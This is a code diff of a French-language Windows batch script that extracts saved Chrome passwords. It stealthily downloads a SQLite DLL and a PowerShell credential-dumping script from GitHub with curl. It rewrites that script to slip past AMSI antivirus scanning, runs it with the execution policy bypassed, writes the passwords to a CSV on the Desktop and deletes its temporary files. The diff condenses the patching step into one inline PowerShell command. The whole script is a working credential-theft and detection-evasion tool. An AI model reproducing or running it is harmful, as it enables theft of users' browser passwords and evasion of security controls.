@@ -695,7 +695,6 @@ echo.
 
 set "WORK_DIR=%TEMP%\chrome_creds_tmp"
 if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
-set "PS_OUT=%WORK_DIR%\run_chrome.ps1"
 
 echo [INFO] 1/2 - Telechargement furtif de la DLL SQLite indispensable...
 if not exist "%WORK_DIR%\System.Data.SQLite.dll" (
@@ -703,29 +702,17 @@ if not exist "%WORK_DIR%\System.Data.SQLite.dll" (
 )
 
 echo [INFO] 2/2 - Creation et execution invisible du Generateur AMSI-Bypass...
-if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
-curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload_temp.txt" 2>nul
-
-> "%WORK_DIR%\make_chrome.ps1" echo $ErrorActionPreference = 'SilentlyContinue'
->> "%WORK_DIR%\make_chrome.ps1" echo $c = Get-Content "%WORK_DIR%\payload_temp.txt" -Raw
->> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
->> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\$arrExp \| Format-Table', ('$arrExp ^| Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
->> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '#requires -version 7', ''
->> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
->> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
->> "%WORK_DIR%\make_chrome.ps1" echo Set-Content "%PS_OUT%" -Value $c
-
-powershell -NoProfile -ExecutionPolicy Bypass -File "%WORK_DIR%\make_chrome.ps1" >nul 2>&1
+curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload.ps1" 2>nul
+powershell -NoProfile -Command "$c = Get-Content '%WORK_DIR%\payload.ps1' -Raw; $c = $c -replace '(?s)""Export"".*?""Import""', '""Export"" { } ""Import""'; $c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path ""' + $HOME + '\Desktop\Chrome_Local_Passwords.csv"" -NoTypeInformation; Write-Host ""`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !"" -ForegroundColor Green'); $c = $c -replace '#requires -version 7', ''; $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '0x00'; $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto""+""graphy'; Set-Content '%WORK_DIR%\run_chrome.ps1' -Value $c" >nul 2>&1
 
 echo.
 echo [LANCEMENT] Extraction en cours... Veuillez patienter...
 cd /d "%WORK_DIR%"
 powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"
 
-rem Nettoyage automatique
-if exist "%PS_OUT%" del "%PS_OUT%"
-if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
-if exist "%WORK_DIR%\make_chrome.ps1" del "%WORK_DIR%\make_chrome.ps1"
+rem Nettoyage automatique immediat
+if exist "run_chrome.ps1" del "run_chrome.ps1"
+if exist "payload.ps1" del "payload.ps1"
 cd /d "%~dp0"
 echo.
 pause
